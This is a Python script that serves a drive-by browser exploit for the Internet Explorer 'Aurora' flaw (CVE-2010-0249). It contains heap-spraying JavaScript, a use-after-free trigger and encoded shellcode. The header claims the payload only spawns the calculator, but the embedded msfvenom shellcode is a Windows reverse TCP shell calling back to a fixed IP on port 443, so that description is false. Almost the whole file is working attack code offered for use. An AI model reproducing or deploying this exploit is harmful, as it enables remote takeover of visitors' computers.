#
#   This program acts as a web server that generates an exploit to
#   target a vulnerability (CVE-2010-0249) in Internet Explorer.
#   The exploit was tested using Internet Explorer 6 on Windows XP SP2.
#   The exploit's payload spawns the calculator.
#
#   Usage  : python ie_aurora.py [port number]
#

import sys
import socket

from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler

class RequestHandler(BaseHTTPRequestHandler):

    def convert_to_utf16(self, payload):
        enc_payload = ''
        for i in range(0, len(payload), 2):
            num = 0
            for j in range(0, 2):
                num += (ord(payload[i + j]) & 0xff) << (j * 8)
            enc_payload += '%%u%04x' % num
        return enc_payload

    def get_payload(self):
  # msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.113 LPORT=443 EXITFUNC=process -b "\x00" -f js_le
	payload = "%u7cb8%uc7ce%udb5c%ud9dd%u2474%u5bf4%uc931%u52b1%uc383%u3104%u0e43%u3f03%u25c0%u43a9%u2b34%ubb52%u4cc5%u5eda%u4cf4%u2bb8%u7ca7%u79ca%uf644%u699e%u7adf%u9e37%u3068%u9161%u6969%ub051%u70e9%u1286%ubad3%u53db%ua614%u0116%uaccd%ub585%uf87a%u3e15%uec30%ua31d%u0f81%u720f%u4999%u758f%ue24e%u6d86%ucf93%u0651%ubb67%uce63%u44b9%u2fcf%ub776%u6811%u28b1%u8064%ud5c1%u577f%u01bb%u43f5%uc11b%uafad%u069d%u242b%ue391%u623f%uf2b6%u19ec%u7fc2%ucd13%u3b42%uc930%u9f0f%u4859%u4eea%u8a65%u2e55%uc1c3%u3b78%u887e%u8814%u32b3%u86e5%u41c4%u09d7%ucd7f%uc15b%u0a59%uf89b%u841e%u0362%u8d5f%u57a0%ua50f%ud801%u35c4%u0dad%u654a%ufe01%ud52b%uaee1%u3fc3%u91ee%u40f4%uba24%ubb9f%ucfaf%uc354%ub85e%uc368%u83a1%u25e4%ue3cb%ufea0%u9d64%u74e8%u6214%uf127%ue816%u06c4%u19d8%u14a0%ue98d%u46ff%uf518%ueed5%u64c6%ueeb2%u9481%ub96d%u6bc6%u2f64%ud2fb%u4dde%u8206%ud519%u77dd%ud4a7%ucc90%uc683%ucc6c%ub28f%u9b20%u6c59%u7587%uc628%u2951%u8ee2%u0124%uc835%u4c28%u34c3%u3998%u4b92%uae15%u3412%u4e4b%uefdc%u7ecf%uad97%u1766%u247e%u7a3b%u9381%u8378%u1102%u7001%u501a%u3c04%u899c%u2d74%uad49%u4e2b%u4158"
	return payload

    def get_exploit(self):
        exploit = '''
        <html>
        <head>
            <script>

            var obj, event_obj;

            function spray_heap()
            {
                var chunk_size, payload, nopsled;

                chunk_size = 0x80000;
                payload = unescape("<PAYLOAD>");
                nopsled = unescape("<NOP>");
                while (nopsled.length < chunk_size)
                    nopsled += nopsled;
                nopsled_len = chunk_size - (payload.length + 20);
                nopsled = nopsled.substring(0, nopsled_len);
                heap_chunks = new Array();
                for (var i = 0 ; i < 200 ; i++)
                    heap_chunks[i] = nopsled + payload;
            }

            function initialize()
            {
                obj = new Array();
                event_obj = null;
                for (var i = 0; i < 200 ; i++ )
                    obj[i] = document.createElement("COMMENT");
            }

            function ev1(evt)
            {
                event_obj = document.createEventObject(evt);
                document.getElementById("sp1").innerHTML = "";
                window.setInterval(ev2, 1);
            }

            function ev2()
            {
                var data, tmp;

                data = "";
                tmp = unescape("%u0a0a%u0a0a");
                for (var i = 0 ; i < 4 ; i++)
                    data += tmp;
                for (i = 0 ; i < obj.length ; i++ ) {
                    obj[i].data = data;
                }
                event_obj.srcElement;
            }

            function check()

		{
                document.write(navigator.userAgent);
                return true;
            }

            if (check()) {
                initialize();
                spray_heap();
            }
            else
                window.location = 'about:blank'

            </script>
        </head>
        <body>
		<h2> Hello </h2>
            <span id="sp1">
            <img src="aurora.gif" onload="ev1(event)">
            </span>
        </body>
        </html>
        '''
        exploit = exploit.replace('<PAYLOAD>', self.get_payload())
        exploit = exploit.replace('<NOP>', '%u0a0a%u0a0a')
        return exploit

    def get_image(self):
        content  = '\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff'
        content += '\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44'
        content += '\x01\x00\x3b'
        return content

    def log_request(self, *args, **kwargs):
        pass

    def do_GET(self):
        try:
            if self.path == '/':
                print
                print '[-] Incoming connection from %s' % self.client_address[0]
                self.send_response(200)
                self.send_header('Content-Type', 'text/html')
                self.end_headers()
                print '[-] Sending exploit to %s ...' % self.client_address[0]
		self.wfile.write(self.get_exploit())
                print '[-] Exploit sent to %s' % self.client_address[0]
            elif self.path == '/aurora.gif':
                self.send_response(200)
                self.send_header('Content-Type', 'image/gif')
                self.end_headers()
                self.wfile.write(self.get_image())
        except:
            print '[*] Error : an error has occured while serving the HTTP request'
            print '[-] Exiting ...'
            sys.exit(-1)


def main():
    if len(sys.argv) != 2:
        print 'Usage: %s [port number (between 1024 and 65535)]' % sys.argv[0]
        sys.exit(0)
    try:
        port = int(sys.argv[1])
        if port < 1024 or port > 65535:
            raise ValueError
        try:
            serv = HTTPServer(('', port), RequestHandler)
            ip = socket.gethostbyname(socket.gethostname())
            print '[-] Web server is running at http://%s:%d/' % (ip, port)
            try:
                serv.serve_forever()
            except:
                print '[-] Exiting ...'
        except socket.error:
            print '[*] Error : a socket error has occurred'
        sys.exit(-1)
    except ValueError:
        print '[*] Error : an invalid port number was given'
        sys.exit(-1)

if __name__ == '__main__':
    main()
